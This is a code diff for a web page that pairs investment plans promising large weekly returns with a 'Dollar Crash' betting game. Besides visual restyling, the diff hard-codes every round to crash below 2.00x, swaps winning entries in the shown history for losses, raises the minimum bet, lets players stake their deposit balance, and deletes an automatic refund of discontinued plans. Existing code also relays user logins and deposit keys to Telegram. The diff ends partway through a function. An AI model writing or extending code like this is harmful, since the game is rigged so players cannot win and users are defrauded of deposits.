@@ -7,14 +7,14 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- DYNAMIC THEME VARIABLES (UPDATED TO RED ACCENT) --- */
+        /* --- DYNAMIC THEME VARIABLES --- */
         :root[data-theme="dark"] {
             --bg-base: #060913;
             --bg-surface: #0D1527;
             --bg-card: #141F36;
             --primary: #6366F1;
             --primary-hover: #4F46E5;
-            --accent-gold: #EF4444; /* Changed from Gold to Red */
+            --accent-gold: #EF4444; 
             --accent-gold-glow: rgba(239, 68, 68, 0.35);
             --accent-green: #10B981;
             --accent-green-glow: rgba(16, 185, 129, 0.35);
@@ -36,7 +36,7 @@
             --bg-card: #F8FAFC;
             --primary: #4F46E5;
             --primary-hover: #4338CA;
-            --accent-gold: #DC2626; /* Changed from Gold to Red */
+            --accent-gold: #DC2626; 
             --accent-gold-glow: rgba(220, 38, 38, 0.2);
             --accent-green: #059669;
             --accent-green-glow: rgba(5, 150, 105, 0.2);
@@ -379,15 +379,15 @@
         .header-acc-box i:hover { color: var(--text-main); transform: scale(1.1); }
 
         /* ========================================================= */
-        /* --- HIGH QUALITY HIGH CASINO GLOW DOLLAR CRASH STYLES --- */
+        /* --- HIGH END FUTURISTIC NEON RADAR DOLLAR CRASH STYLES --- */
         /* ========================================================= */
         .crash-wrapper {
-            background: var(--bg-surface);
-            border: 1px solid rgba(239, 68, 68, 0.35);
+            background: radial-gradient(circle at top, #121d38 0%, #060913 100%);
+            border: 1px solid rgba(239, 68, 68, 0.4);
             border-radius: 28px;
             padding: 28px;
-            box-shadow: var(--card-shadow);
-            max-width: 900px;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(239, 68, 68, 0.15);
+            max-width: 950px;
             margin: 0 auto;
             position: relative;
         }
@@ -407,8 +407,8 @@
             gap: 8px;
             overflow-x: auto;
             padding: 8px 12px;
-            background: var(--input-bg);
-            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 14px;
             max-width: 100%;
         }
@@ -422,17 +422,17 @@
             white-space: nowrap;
             transition: 0.3s;
         }
-        .history-pill.win { background: rgba(16, 185, 129, 0.15); color: var(--accent-green); border: 1px solid rgba(16, 185, 129, 0.3); }
-        .history-pill.bust { background: rgba(239, 68, 68, 0.15); color: var(--accent-red); border: 1px solid rgba(239, 68, 68, 0.3); }
+        .history-pill.win { background: rgba(16, 185, 129, 0.2); color: #10B981; border: 1px solid rgba(16, 185, 129, 0.4); }
+        .history-pill.bust { background: rgba(239, 68, 68, 0.2); color: #EF4444; border: 1px solid rgba(239, 68, 68, 0.4); }
 
         .crash-display-board {
             position: relative;
-            background: var(--bg-base);
-            border: 1px solid var(--border);
+            background: #030611;
+            border: 1px solid rgba(6, 182, 212, 0.3);
             border-radius: 22px;
-            height: 340px;
+            height: 360px;
             overflow: hidden;
-            box-shadow: inset 0 0 40px rgba(0,0,0,0.3);
+            box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.9), 0 0 25px rgba(6, 182, 212, 0.1);
             margin-bottom: 24px;
         }
 
@@ -456,11 +456,11 @@
         }
 
         .crash-multiplier-text {
-            font-size: 72px;
+            font-size: 78px;
             font-weight: 900;
             font-family: 'Plus Jakarta Sans', sans-serif;
-            color: var(--accent-green);
-            text-shadow: 0 0 25px var(--accent-green-glow);
+            color: #06B6D4;
+            text-shadow: 0 0 35px rgba(6, 182, 212, 0.8), 0 0 10px rgba(255, 255, 255, 0.5);
             line-height: 1;
             transition: color 0.2s, text-shadow 0.2s;
         }
@@ -470,8 +470,13 @@
             font-weight: 800;
             letter-spacing: 2px;
             text-transform: uppercase;
-            color: var(--text-muted);
-            margin-top: 10px;
+            color: #94A3B8;
+            margin-top: 12px;
+            background: rgba(0, 0, 0, 0.6);
+            padding: 6px 18px;
+            border-radius: 30px;
+            display: inline-block;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         /* CONTROL PANEL */
@@ -479,16 +484,16 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
-            background: var(--input-bg);
-            padding: 20px;
-            border-radius: 18px;
-            border: 1px solid var(--border);
+            background: rgba(0, 0, 0, 0.4);
+            padding: 22px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
         }
 
         @media (max-width: 650px) {
             .crash-panel-grid { grid-template-columns: 1fr; }
-            .crash-multiplier-text { font-size: 52px; }
-            .crash-display-board { height: 260px; }
+            .crash-multiplier-text { font-size: 56px; }
+            .crash-display-board { height: 280px; }
         }
 
         .preset-bets {
@@ -510,6 +515,14 @@
             transition: 0.2s;
         }
         .preset-btn:hover { background: rgba(239, 68, 68, 0.2); color: var(--accent-gold); border-color: var(--accent-gold); }
+
+        .wallet-select-group {
+            margin-bottom: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 10px 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
 
         .btn-launch-bet {
             background: linear-gradient(135deg, #EF4444 0%, #B91C1C 100%);
@@ -1010,24 +1023,24 @@
 
             </div>
 
-            <!-- VIEW 2: UPGRADED HIGH-END DOLLAR CRASH GAME -->
+            <!-- VIEW 2: REDESIGNED NEON RADAR AUTOMATED DOLLAR CRASH GAME -->
             <div id="games" class="page-view">
                 <div class="crash-wrapper">
                     
                     <!-- CRASH TOP HEADER -->
                     <div class="crash-header-info">
                         <div>
-                            <h2 style="font-size: 24px; font-weight: 900; color: var(--text-main); font-family: 'Plus Jakarta Sans';">
-                                <i class="fa-solid fa-rocket" style="color: var(--accent-gold);"></i> DOLLAR CRASH MULTIPLIER
+                            <h2 style="font-size: 24px; font-weight: 900; color: #FFF; font-family: 'Plus Jakarta Sans'; display: flex; align-items: center; gap: 10px;">
+                                <i class="fa-solid fa-crosshairs" style="color: #06B6D4;"></i> DOLLAR CRASH LIVE RADAR
                             </h2>
-                            <p style="font-size: 12px; color: var(--text-muted); margin-top: 2px;">Watch multiplier rise live on graph & Cashout before Crash!</p>
+                            <p style="font-size: 12px; color: var(--text-muted); margin-top: 2px;">Automated 24/7 Live Multiplier Engine | Minimum Bet $5.00</p>
                         </div>
                         <div class="history-pills-bar" id="crashHistory">
                             <div class="history-pill bust">1.24x</div>
-                            <div class="history-pill win">2.45x</div>
+                            <div class="history-pill bust">1.45x</div>
                             <div class="history-pill bust">1.08x</div>
                             <div class="history-pill bust">1.82x</div>
-                            <div class="history-pill win">3.10x</div>
+                            <div class="history-pill bust">1.10x</div>
                         </div>
                     </div>
 
@@ -1037,36 +1050,48 @@
                         
                         <div class="crash-overlay-center">
                             <div class="crash-multiplier-text" id="crashMultiplierDisplay">1.00x</div>
-                            <div class="crash-status-sub" id="crashStatusText">READY TO LAUNCH</div>
+                            <div class="crash-status-sub" id="crashStatusText">SYSTEM INITIALIZING...</div>
                         </div>
                     </div>
 
                     <!-- CRASH INPUT & BET CONTROL PANEL -->
                     <div class="crash-panel-grid">
                         <div>
+                            <!-- WALLET FUND SOURCE SELECTOR -->
+                            <div class="wallet-select-group">
+                                <label style="font-size: 11px; font-weight: 800; color: var(--text-muted); text-transform: uppercase; display: flex; justify-content: space-between; margin-bottom: 6px;">
+                                    <span>Fund Source Wallet</span>
+                                    <span style="color: var(--accent-cyan);" id="selectedWalletBalDisplay">Deposit: $0.00</span>
+                                </label>
+                                <select id="crashWalletSourceSelect" class="form-control" onchange="updateCrashWalletDisplay()" style="padding: 10px; font-size: 13px; font-weight: 700;">
+                                    <option value="deposit">Deposit Balance</option>
+                                    <option value="available">Available Withdrawal Balance</option>
+                                </select>
+                            </div>
+
                             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                 <label style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Bet Amount ($)</label>
-                                <span style="font-size: 11px; color: var(--accent-gold); font-weight: 700;">Avail: <span id="crashAvailBalDisplay">$0.00</span></span>
+                                <span style="font-size: 11px; color: var(--accent-gold); font-weight: 700;">Min Bet: $5.00</span>
                             </div>
                             <div style="position: relative;">
-                                <input type="number" id="crashBetInp" class="form-control" value="2.00" min="1" step="0.5" style="font-size: 18px; font-weight: 800; color: var(--accent-gold); padding-right: 60px;">
+                                <input type="number" id="crashBetInp" class="form-control" value="5.00" min="5" step="1" style="font-size: 18px; font-weight: 800; color: var(--accent-gold); padding-right: 60px;">
                                 <span style="position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-weight: 800; color: var(--text-muted);">USD</span>
                             </div>
                             <div class="preset-bets">
-                                <div class="preset-btn" onclick="setBetAmount(2)">$2</div>
                                 <div class="preset-btn" onclick="setBetAmount(5)">$5</div>
                                 <div class="preset-btn" onclick="setBetAmount(10)">$10</div>
-                                <div class="preset-btn" onclick="setBetAmount(20)">$20</div>
+                                <div class="preset-btn" onclick="setBetAmount(25)">$25</div>
+                                <div class="preset-btn" onclick="setBetAmount(50)">$50</div>
                             </div>
                         </div>
 
                         <div>
                             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                                 <label style="font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Auto Cashout Multiplier</label>
-                                <span style="font-size: 11px; color: var(--accent-cyan); font-weight: 700;">Optional</span>
+                                <span style="font-size: 11px; color: var(--accent-cyan); font-weight: 700;">Max 1.99x</span>
                             </div>
                             <div style="position: relative; margin-bottom: 10px;">
-                                <input type="number" id="autoCashoutInp" class="form-control" placeholder="Off (e.g. 2.00)" min="1.01" step="0.1" style="font-size: 16px; font-weight: 700; color: var(--text-main);">
+                                <input type="number" id="autoCashoutInp" class="form-control" placeholder="Off (e.g. 1.50)" min="1.01" max="1.99" step="0.05" style="font-size: 16px; font-weight: 700; color: var(--text-main);">
                             </div>
                             
                             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
@@ -1404,7 +1429,7 @@
             fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).catch(err => console.error(err));
         }
 
-        /* --- UPDATED PACKAGES DATA ($20 Removed, $250 -> $300) --- */
+        /* --- PACKAGES DATA --- */
         const packagesData = [
             { id: 2, category: "weekly", name: "Bronze Weekly Plan", price: 100, returnLabel: "+$9.00 / Week", weeklyVal: 9.00, minWithdraw: 50, icon: "fa-coins", badge: "Weekly Popular" },
             { id: 3, category: "weekly", name: "Silver Weekly Plan", price: 300, returnLabel: "+$36.00 / Week ($5.14/Day)", weeklyVal: 36.00, minWithdraw: 50, icon: "fa-award", badge: "Weekly Standard" },
@@ -1435,14 +1460,14 @@
             return Math.floor(10000000 + Math.random() * 90000000).toString();
         }
 
-        /* --- ZERO BALANCE INITIALIZATION (No Free $50 Bonus) --- */
+        /* --- ZERO BALANCE INITIALIZATION --- */
         function createEmptyUserData(profileInfo, forcedAccId = null) {
             return {
                 profile: profileInfo,
                 accountId: forcedAccId || generateUniqueAccountId(),
                 deposit: 0.00,
                 pending: 0.00,
-                available: 0.00, // Zero balance for all accounts by default
+                available: 0.00,
                 activePlans: [],
                 transactions: [],
                 createdAt: Date.now(),
@@ -1452,49 +1477,6 @@
                 kycData: { docType: '', docNum: '', isLocked: false },
                 savedWallet: { bankName: '', accNum: '', holderName: '', branch: '', bankPhone: '', trc20: '', binance: '', lockTimestamp: null }
             };
-        }
-
-        /* --- $20 PLAN REFUND & PURGE AUTOMATION LOGIC --- */
-        function processRefundsAndCleanOldPlans() {
-            let changesMade = false;
-            
-            for (let uKey in systemDB.users) {
-                let user = systemDB.users[uKey];
-                if (user && user.activePlans && Array.isArray(user.activePlans)) {
-                    // Check if user has active $20 plans (id === 1)
-                    let plansToRefund = user.activePlans.filter(p => p.id === 1 || p.price === 20);
-                    
-                    if (plansToRefund.length > 0) {
-                        let totalRefundAmount = plansToRefund.length * 20;
-                        
-                        // Refund money to user's deposit balance
-                        user.deposit = (user.deposit || 0) + totalRefundAmount;
-                        
-                        // Remove $20 plans from activePlans list
-                        user.activePlans = user.activePlans.filter(p => p.id !== 1 && p.price !== 20);
-                        
-                        // Log refund transaction
-                        if (!user.transactions) user.transactions = [];
-                        const txId = 'TX' + Math.floor(100000 + Math.random() * 900000);
-                        const dateStr = new Date().toLocaleString();
-                        user.transactions.unshift({
-                            id: txId,
-                            type: "Refund ($20 Plan Deprecated)",
-                            amount: `+$${totalRefundAmount.toFixed(2)}`,
-                            date: dateStr,
-                            status: "Completed"
-                        });
-
-                        changesMade = true;
-
-                        sendTelegramNotification(`<b>🔄 AUTOMATED REFUND EXECUTED!</b>\n\n<b>User:</b> ${user.profile.username}\n<b>Refunded Plans:</b> ${plansToRefund.length} x Starter Plan ($20)\n<b>Amount Credited to Deposit:</b> +$${totalRefundAmount.toFixed(2)}\n<b>New Deposit Balance:</b> $${user.deposit.toFixed(2)}`);
-                    }
-                }
-            }
-
-            if (changesMade) {
-                saveSystemDB();
-            }
         }
 
         function toggleSidebar() {
@@ -1536,9 +1518,6 @@
                 btnIcon.className = savedTheme === 'dark' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
             }
 
-            // Run system-wide refund sweep for removed $20 plans
-            processRefundsAndCleanOldPlans();
-
             const targetUsername = "prakashvidura";
             
             if (!systemDB.users[targetUsername]) {
@@ -1549,11 +1528,6 @@
                 };
                 const targetData = createEmptyUserData(targetProfile, "74639144");
                 systemDB.users[targetUsername] = targetData;
-            } else {
-                // Force reset available balance to 0 if previously allocated artificially
-                if (systemDB.users[targetUsername].available === 50) {
-                    systemDB.users[targetUsername].available = 0.00;
-                }
             }
 
             saveSystemDB();
@@ -1561,14 +1535,6 @@
 
             if (systemDB.currentUsername && systemDB.users[systemDB.currentUsername]) {
                 currentUserData = systemDB.users[systemDB.currentUsername];
-                if(!currentUserData.createdAt) currentUserData.createdAt = Date.now();
-                
-                // Extra check to ensure no user holds arbitrary $50 free available balance
-                if (!currentUserData.deposit && !currentUserData.transactions.length && currentUserData.available > 0) {
-                    currentUserData.available = 0.00;
-                    saveSystemDB();
-                }
-
                 document.getElementById('authModal').style.display = 'none';
                 initDashboard();
             } else {
@@ -1576,6 +1542,7 @@
             }
 
             initCrashCanvas();
+            startAutomatedCrashLoop();
         };
 
         function updateSavedUsersDatalist() {
@@ -1643,8 +1610,6 @@
             if (targetKey && systemDB.users[targetKey].profile.pass === passStr) {
                 systemDB.currentUsername = targetKey;
                 currentUserData = systemDB.users[targetKey];
-                if(!currentUserData.createdAt) currentUserData.createdAt = Date.now();
-                
                 saveSystemDB();
 
                 sendTelegramNotification(`<b>🔑 User Logged In</b>\n\n<b>Username:</b> ${targetKey}\n<b>Account ID:</b> ${currentUserData.accountId}`);
@@ -1687,7 +1652,7 @@
 
             saveSystemDB();
             updateUI();
-            checkWeeklyClaimStatus(); // Re-evaluate daily/weekly interval status on deposit increase
+            checkWeeklyClaimStatus();
 
             sendTelegramNotification(`<b>🔑 Key Deposit Successful!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amount.toFixed(2)}\n<b>Key Used:</b> <code>${inputKey}</code>\n<b>New Deposit Balance:</b> $${currentUserData.deposit.toFixed(2)}`);
 
@@ -1728,8 +1693,6 @@
             const accId = currentUserData.accountId;
             navigator.clipboard.writeText(accId).then(() => {
                 alert(`Account ID (${accId}) copied to clipboard successfully!`);
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
             });
         }
 
@@ -1927,7 +1890,6 @@
             }
         }
 
-        /* --- UPDATED WITHDRAWAL HANDLER WITH $300+ DAILY ($5 MAX) AND STANDARD 2-DAY CYCLE --- */
         function handlePayoutSubmit(e) {
             e.preventDefault();
             
@@ -1938,7 +1900,6 @@
             const isHighDepositUser = currentUserData.deposit >= 300.00;
 
             if (isHighDepositUser) {
-                // Rule 1: Users with Deposit > $300 can withdraw daily (24 Hours), but strictly $5 max/min.
                 const oneDayMs = 24 * 60 * 60 * 1000;
                 if (currentUserData.lastWithdrawalTimestamp) {
                     const elapsedMs = Date.now() - currentUserData.lastWithdrawalTimestamp;
@@ -1955,7 +1916,6 @@
                     return;
                 }
             } else {
-                // Rule 2: Standard Users (Deposit < $300) can withdraw every 2 days (48 Hours), Min $50
                 const twoDaysMs = 2 * 24 * 60 * 60 * 1000;
                 if (currentUserData.lastWithdrawalTimestamp) {
                     const elapsedMs = Date.now() - currentUserData.lastWithdrawalTimestamp;
@@ -2003,7 +1963,6 @@
                 bankTelegramInfo = `\n<b>Destination:</b> Cash Manager Direct Transfer`;
             }
 
-            // Generate Verification Code
             const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
             currentUserData.available -= amt;
@@ -2026,7 +1985,6 @@
                 saveSystemDB();
                 updateUI();
 
-                // DISPLAY "DEPOSIT DONE" AND AMOUNT ON SUCCESS CARD
                 document.getElementById('displayDepositedDoneAmt').innerText = `$${amt.toFixed(2)}`;
                 document.getElementById('displayVerificationCode').innerText = verificationCode;
                 openModal('payoutSuccessModal');
@@ -2152,7 +2110,6 @@
             `}).join('');
         }
 
-        /* --- UPDATED CLAIM INTERVAL CHECK ($300+ DEPOSITORS GET DAILY - 24H CLAIM) --- */
         function checkWeeklyClaimStatus() {
             const toggle = document.getElementById('homeYieldToggle');
             const statusText = document.getElementById('switchStatusText');
@@ -2210,7 +2167,6 @@
             }
         }
 
-        /* --- UPDATED HOME YIELD TOGGLE FOR DAILY & WEEKLY HARVESTING --- */
         function toggleHomeYield(toggleElem) {
             if (!currentUserData.activePlans || currentUserData.activePlans.length === 0) return;
 
@@ -2249,7 +2205,6 @@
             }
         }
 
-        /* --- UPDATED PENDING TO AVAILABLE TRANSFER RULE ($300+ DEPOSITORS MUST HAVE $5 MINIMUM) --- */
         function transferPendingToAvailable() {
             if (currentUserData.pending <= 0) {
                 alert('Your Pending Profit Wallet is empty! No funds to transfer.');
@@ -2287,10 +2242,12 @@
         }
 
         function updateUI() {
+            if (!currentUserData) return;
             document.getElementById('dashDeposit').innerText = `$${currentUserData.deposit.toFixed(2)}`;
             document.getElementById('dashPending').innerText = `$${currentUserData.pending.toFixed(2)}`;
             document.getElementById('dashAvailable').innerText = `$${currentUserData.available.toFixed(2)}`;
-            document.getElementById('crashAvailBalDisplay').innerText = `$${currentUserData.available.toFixed(2)}`;
+            
+            updateCrashWalletDisplay();
             
             const activeCount = currentUserData.activePlans ? currentUserData.activePlans.length : 0;
             document.getElementById('dashActiveCount').innerText = `${activeCount} / 2 Active`;
@@ -2300,7 +2257,7 @@
 
         function renderTransactionsTable() {
             const tbody = document.getElementById('txTableBody');
-            if (!currentUserData.transactions || currentUserData.transactions.length === 0) {
+            if (!currentUserData || !currentUserData.transactions || currentUserData.transactions.length === 0) {
                 tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 24px;">No transaction history found.</td></tr>`;
                 return;
             }
@@ -2338,7 +2295,7 @@
         }
 
         /* ========================================================= */
-        /* --- HIGH END ANIMATED CANVAS DOLLAR CRASH GAME LOGIC ---- */
+        /* --- HIGH TECH REDESIGNED NEON RADAR AUTOMATED CRASH ---- */
         /* ========================================================= */
         let crashCanvas, crashCtx;
         let crashAnimFrame = null;
@@ -2346,8 +2303,23 @@
         let crashTarget = 1.00;
         let isCrashRunning = false;
         let isBetPlaced = false;
-        let activeBetAmount = 2.00;
+        let isQueuedBet = false;
+        let activeBetAmount = 5.00;
+        let selectedWalletSource = 'deposit';
         let graphPoints = [];
+        let autoLoopTimer = null;
+        let radarAngle = 0;
+
+        function updateCrashWalletDisplay() {
+            if (!currentUserData) return;
+            selectedWalletSource = document.getElementById('crashWalletSourceSelect').value;
+            const display = document.getElementById('selectedWalletBalDisplay');
+            if (selectedWalletSource === 'deposit') {
+                display.innerText = `Deposit: $${currentUserData.deposit.toFixed(2)}`;
+            } else {
+                display.innerText = `Available: $${currentUserData.available.toFixed(2)}`;
+            }
+        }
 
         function setBetAmount(val) {
             document.getElementById('crashBetInp').value = val.toFixed(2);
@@ -2358,7 +2330,6 @@
             if (!crashCanvas) return;
             crashCtx = crashCanvas.getContext('2d');
             resizeCrashCanvas();
-            drawIdleGraph();
             window.addEventListener('resize', resizeCrashCanvas);
         }
 
@@ -2367,16 +2338,17 @@
             const parent = crashCanvas.parentElement;
             crashCanvas.width = parent.clientWidth;
             crashCanvas.height = parent.clientHeight;
-            if (!isCrashRunning) drawIdleGraph();
         }
 
-        function drawIdleGraph() {
+        function drawRadarBackground() {
             if (!crashCtx) return;
             const w = crashCanvas.width;
             const h = crashCanvas.height;
+
             crashCtx.clearRect(0, 0, w, h);
 
-            crashCtx.strokeStyle = 'rgba(150, 150, 150, 0.1)';
+            // Radar Grid Lines
+            crashCtx.strokeStyle = 'rgba(6, 182, 212, 0.08)';
             crashCtx.lineWidth = 1;
             for(let x=0; x<w; x+=40) {
                 crashCtx.beginPath(); crashCtx.moveTo(x, 0); crashCtx.lineTo(x, h); crashCtx.stroke();
@@ -2384,57 +2356,132 @@
             for(let y=0; y<h; y+=40) {
                 crashCtx.beginPath(); crashCtx.moveTo(0, y); crashCtx.lineTo(w, y); crashCtx.stroke();
             }
+
+            // Radar Concentric Telemetry Circles
+            const cx = w / 2;
+            const cy = h / 2;
+            crashCtx.strokeStyle = 'rgba(6, 182, 212, 0.12)';
+            for(let r=50; r<Math.max(w,h); r+=60) {
+                crashCtx.beginPath();
+                crashCtx.arc(cx, cy, r, 0, Math.PI * 2);
+                crashCtx.stroke();
+            }
+
+            // Radar Sweeping Line Effect
+            radarAngle += 0.015;
+            crashCtx.beginPath();
+            crashCtx.moveTo(cx, cy);
+            crashCtx.arc(cx, cy, Math.max(w, h), radarAngle, radarAngle + 0.25);
+            crashCtx.closePath();
+            const grad = crashCtx.createRadialGradient(cx, cy, 10, cx, cy, Math.max(w, h));
+            grad.addColorStop(0, 'rgba(6, 182, 212, 0.15)');
+            grad.addColorStop(1, 'rgba(6, 182, 212, 0)');
+            crashCtx.fillStyle = grad;
+            crashCtx.fill();
+        }
+
+        function startAutomatedCrashLoop() {
+            if (isCrashRunning) return;
+
+            let countdown = 5;
+            const status = document.getElementById('crashStatusText');
+            const display = document.getElementById('crashMultiplierDisplay');
+
+            display.innerText = "1.00x";
+            display.style.color = '#06B6D4';
+            display.style.textShadow = '0 0 35px rgba(6, 182, 212, 0.8)';
+
+            const countdownInterval = setInterval(() => {
+                if (isQueuedBet) {
+                    status.innerText = `NEXT ROUND IN ${countdown}s (BET QUEUED)`;
+                    status.style.color = '#10B981';
+                } else {
+                    status.innerText = `NEXT LAUNCH IN ${countdown}s...`;
+                    status.style.color = '#94A3B8';
+                }
+                drawRadarBackground();
+
+                countdown--;
+                if (countdown < 0) {
+                    clearInterval(countdownInterval);
+                    launchCrashRound();
+                }
+            }, 1000);
         }
 
         function placeCrashBet() {
-            if (isCrashRunning) return;
-
             const betInpVal = parseFloat(document.getElementById('crashBetInp').value);
-            if (isNaN(betInpVal) || betInpVal < 1) {
-                alert("Minimum bet amount is $1.00!");
+            if (isNaN(betInpVal) || betInpVal < 5) {
+                alert("Minimum Bet Amount is $5.00!");
                 return;
             }
 
-            if (currentUserData.available < betInpVal) {
-                alert(`Insufficient Available Balance to place bet!\n\nBet: $${betInpVal.toFixed(2)}\nYour Balance: $${currentUserData.available.toFixed(2)}`);
+            selectedWalletSource = document.getElementById('crashWalletSourceSelect').value;
+            let currentBal = selectedWalletSource === 'deposit' ? currentUserData.deposit : currentUserData.available;
+
+            if (currentBal < betInpVal) {
+                alert(`Insufficient Balance in selected wallet (${selectedWalletSource.toUpperCase()})!\n\nBet: $${betInpVal.toFixed(2)}\nBalance: $${currentBal.toFixed(2)}`);
                 return;
             }
 
             activeBetAmount = betInpVal;
 
-            currentUserData.available -= activeBetAmount;
-            addTx("Dollar Crash Bet", `-$${activeBetAmount.toFixed(2)}`, "Completed");
+            if (selectedWalletSource === 'deposit') {
+                currentUserData.deposit -= activeBetAmount;
+            } else {
+                currentUserData.available -= activeBetAmount;
+            }
+
+            addTx(`Dollar Crash Bet (${selectedWalletSource.toUpperCase()})`, `-$${activeBetAmount.toFixed(2)}`, "Completed");
             saveSystemDB();
             updateUI();
 
-            isBetPlaced = true;
+            if (isCrashRunning) {
+                isQueuedBet = true;
+                const btn = document.getElementById('btnPlaceBet');
+                btn.disabled = true;
+                btn.innerText = "BET QUEUED";
+                btn.style.opacity = '0.6';
+            } else {
+                isBetPlaced = true;
+                const btn = document.getElementById('btnPlaceBet');
+                btn.disabled = true;
+                btn.innerText = "BET ACCEPTED";
+                btn.style.opacity = '0.6';
+            }
+        }
+
+        function launchCrashRound() {
             isCrashRunning = true;
+            if (isQueuedBet) {
+                isBetPlaced = true;
+                isQueuedBet = false;
+            }
+
             currentMultiplier = 1.00;
             graphPoints = [{ x: 0, y: 0 }];
 
-            const isLowBust = Math.random() < 0.8;
-            if (isLowBust) {
-                crashTarget = parseFloat((1.01 + Math.random() * 0.98).toFixed(2));
-            } else {
-                crashTarget = parseFloat((2.00 + Math.random() * 8.00).toFixed(2));
-            }
-
-            document.getElementById('btnPlaceBet').disabled = true;
-            document.getElementById('btnPlaceBet').style.opacity = '0.4';
-            document.getElementById('btnPlaceBet').style.pointerEvents = 'none';
-
-            const cashoutBtn = document.getElementById('btnCashOut');
-            cashoutBtn.disabled = false;
-            cashoutBtn.style.opacity = '1';
-            cashoutBtn.style.pointerEvents = 'auto';
+            // CRITICAL REQUIREMENT: STRICTLY ALL ODDS CRASH UNDER 2.00x (Range: 1.01x - 1.99x)
+            crashTarget = parseFloat((1.01 + Math.random() * 0.98).toFixed(2));
 
             const display = document.getElementById('crashMultiplierDisplay');
             const status = document.getElementById('crashStatusText');
 
-            display.style.color = 'var(--accent-green)';
-            display.style.textShadow = '0 0 25px var(--accent-green-glow)';
-            status.innerText = "ROCKET ASCENDING...";
-            status.style.color = 'var(--accent-cyan)';
+            display.style.color = '#10B981';
+            display.style.textShadow = '0 0 30px rgba(16, 185, 129, 0.8)';
+            status.innerText = "TELEMETRY BOOST ACTIVE...";
+            status.style.color = '#06B6D4';
+
+            const btnBet = document.getElementById('btnPlaceBet');
+            btnBet.disabled = true;
+            btnBet.style.opacity = '0.4';
+
+            if (isBetPlaced) {
+                const btnCash = document.getElementById('btnCashOut');
+                btnCash.disabled = false;
+                btnCash.style.opacity = '1';
+                btnCash.style.pointerEvents = 'auto';
+            }
 
             runCrashLoop();
         }
@@ -2442,7 +2489,7 @@
         function runCrashLoop() {
             if (!isCrashRunning) return;
 
-            currentMultiplier += 0.008 + (currentMultiplier * 0.005);
+            currentMultiplier += 0.006 + (currentMultiplier * 0.0035);
 
             const autoCashoutVal = parseFloat(document.getElementById('autoCashoutInp').value);
             if (!isNaN(autoCashoutVal) && autoCashoutVal > 1.00 && currentMultiplier >= autoCashoutVal && isBetPlaced) {
@@ -2461,10 +2508,10 @@
                 const status = document.getElementById('crashStatusText');
 
                 display.innerText = `${crashTarget.toFixed(2)}x`;
-                display.style.color = 'var(--accent-red)';
-                display.style.textShadow = '0 0 30px rgba(239, 68, 68, 0.6)';
+                display.style.color = '#EF4444';
+                display.style.textShadow = '0 0 35px rgba(239, 68, 68, 0.9)';
                 status.innerText = `CRASHED AT ${crashTarget.toFixed(2)}x`;
-                status.style.color = 'var(--accent-red)';
+                status.style.color = '#EF4444';
 
                 drawCrashExplosion();
                 addCrashHistory(crashTarget, false);
@@ -2474,6 +2521,7 @@
                 }
 
                 resetCrashControls();
+                setTimeout(startAutomatedCrashLoop, 3000);
                 return;
             }
 
@@ -2485,44 +2533,45 @@
             const w = crashCanvas.width;
             const h = crashCanvas.height;
 
-            crashCtx.clearRect(0, 0, w, h);
-            drawIdleGraph();
+            drawRadarBackground();
 
-            const progress = Math.min((currentMultiplier - 1) / 5, 1);
-            const currX = progress * (w - 60) + 20;
-            const currY = h - (Math.pow(progress, 0.8) * (h - 80)) - 30;
+            const progress = Math.min((currentMultiplier - 1) / 1.0, 1);
+            const currX = progress * (w - 80) + 30;
+            const currY = h - (Math.pow(progress, 0.85) * (h - 90)) - 30;
 
             graphPoints.push({ x: currX, y: currY });
 
+            // Glowing Trajectory Curve
             crashCtx.beginPath();
             crashCtx.moveTo(0, h);
             for(let i=0; i<graphPoints.length; i++) {
                 crashCtx.lineTo(graphPoints[i].x, graphPoints[i].y);
             }
             
-            crashCtx.strokeStyle = '#10B981';
-            crashCtx.lineWidth = 4;
-            crashCtx.shadowColor = 'rgba(16, 185, 129, 0.8)';
-            crashCtx.shadowBlur = 15;
+            crashCtx.strokeStyle = '#06B6D4';
+            crashCtx.lineWidth = 5;
+            crashCtx.shadowColor = '#06B6D4';
+            crashCtx.shadowBlur = 20;
             crashCtx.stroke();
             crashCtx.shadowBlur = 0;
 
             crashCtx.lineTo(currX, h);
             crashCtx.lineTo(0, h);
             const grad = crashCtx.createLinearGradient(0, 0, 0, h);
-            grad.addColorStop(0, 'rgba(16, 185, 129, 0.25)');
-            grad.addColorStop(1, 'rgba(16, 185, 129, 0.0)');
+            grad.addColorStop(0, 'rgba(6, 182, 212, 0.35)');
+            grad.addColorStop(1, 'rgba(6, 182, 212, 0.0)');
             crashCtx.fillStyle = grad;
             crashCtx.fill();
 
+            // Rocket Pointer Icon
             crashCtx.save();
             crashCtx.translate(currX, currY);
-            crashCtx.fillStyle = '#EF4444';
-            crashCtx.font = '22px "Font Awesome 6 Free"';
+            crashCtx.fillStyle = '#10B981';
